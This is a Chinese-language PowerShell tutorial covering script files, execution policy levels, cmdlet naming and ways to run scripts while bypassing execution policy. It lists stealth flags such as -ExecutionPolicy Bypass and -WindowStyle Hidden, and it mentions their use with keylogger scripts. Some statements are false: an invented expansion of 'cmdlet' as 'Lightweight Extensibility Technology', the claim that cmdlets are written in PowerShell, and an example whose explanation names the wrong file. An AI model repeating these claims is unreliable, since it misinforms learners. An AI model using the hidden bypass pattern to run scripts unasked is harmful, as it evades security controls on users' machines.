特点

脚本文件

通常，PowerShell 脚本文件使用 .ps1 后缀作为文件扩展名。后缀的最后一个字符是数字1，而不是字母l,script.ps1 就是一个 PowerShell 脚本文件。

PowerShell 的脚本文件是常见的文本文件，其每个命令都是独立的一行。

执行策略

使用以下命令查询执行策略

  1. Restricted - 脚本不能运行。
  2. RemoteSigned - 本地创建的脚本可以运行，但从网上下载的脚本不能运行（除非它们拥有由受信任的发布者签署的数字签名）。
  3. AllSigned – 仅当脚本由受信任的发布者签名才能运行。
  4. Unrestricted – 脚本执行不受限制，不管来自哪里，也不管它们是否有签名。

常用命令

介绍

在 PowerShell 中，命令通常被称为 “cmdlet”（命令-LET）。”cmdlet” 是由 “命令”（Command）和 “Let”（简称 for “Lightweight Extensibility Technology”）两个词组合而成的。

PowerShell 的 cmdlet 是一种特殊类型的命令，它们是用 PowerShell 编写的可执行程序。这些 cmdlet 用于执行各种操作，如管理文件和文件夹、操作注册表、管理进程、配置系统设置等。

每个 cmdlet 都有一个唯一的名称，遵循一定的命名规则。通常，cmdlet 的名称由一个动词和一个或多个名词组成，中间使用连字符（-）分隔。例如，Get-Process、Set-Variable、Remove-Item 等都是常见的 cmdlet 名称。

动词通常表示操作的类型，如获取（Get）、设置（Set）、删除（Remove）、新建（New）。名词则表示操作的目标或对象，如进程（Process）、变量（Variable）、项目（Item）。

除了 cmdlet，PowerShell 还支持函数（Function）和脚本（Script）等命令类型，它们也可以根据命名规则进行命名。

命令的别名一般也兼容Windows Command 和Linux shell,powershell的命令不区分大小写。

绕权执行脚本

常用参数说明：

  • -ExecutionPolicy Bypass（-Exec Bypass）：绕过执行安全策略。这个参数非常重要。在默认情况下，PowerShell的安全策略规定PowerShell不能运行命令和文件。
  • -WindowStyle Hidden （-W Hidden）：隐藏窗口。
  • -NonInteractive（-NonI）：非交互模式。PowerShell不为用户提供交互式的提示。
  • -NoProfile（-NoP）：PowerShell控制台不加载当前用户的配置文件。
  • —noexit：执行后不退出Shell。这个参数在使用键盘记录等脚本时非常重要。
  • -NoLogo：启动不显示版权标志的PowerShell。

绕过本地权限执行脚本

一般我们的脚本执行策略是Restricted - 脚本不能运行。并且修改执行策略需要管理员权限。可以使用下列命令绕过本地权限执行脚本：

  • powershell.exe：这是运行 PowerShell 的可执行文件。
  • -exec bypass：这是 PowerShell 的执行策略参数，bypass 表示绕过执行策略。默认情况下，PowerShell 执行策略可能会限制脚本的执行。通过指定 bypass，可以绕过这些限制。
  • -file mf.ps1：这是指定要执行的脚本文件的参数。在这个例子中，mf.ps1 是脚本的文件名。使用 -file 参数可以告诉 PowerShell 执行指定的脚本文件。

综上所述，powershell.exe -exec bypass -file mf.ps1 命令用于以绕过执行策略的方式执行名为 mf.ps1 的 PowerShell 脚本。

  • powershell.exe：这是运行 PowerShell 的可执行文件。
  • -exec bypass：这是 PowerShell 的执行策略参数，bypass 表示绕过执行策略。默认情况下，PowerShell 执行策略可能会限制脚本的执行。通过指定 bypass，可以绕过这些限制。
  • -Command：这是指定要在 PowerShell 中执行的命令的参数。
  • "& {Import-Module .\test.ps1}"：这是要执行的命令。在这个例子中，命令是一个脚本块 & {Import-Module .\test.ps1}，其中使用 Import-Module 命令导入名为 test.ps1 的 PowerShell 模块。.\test.ps1 表示相对路径下的 mf.ps1 文件。
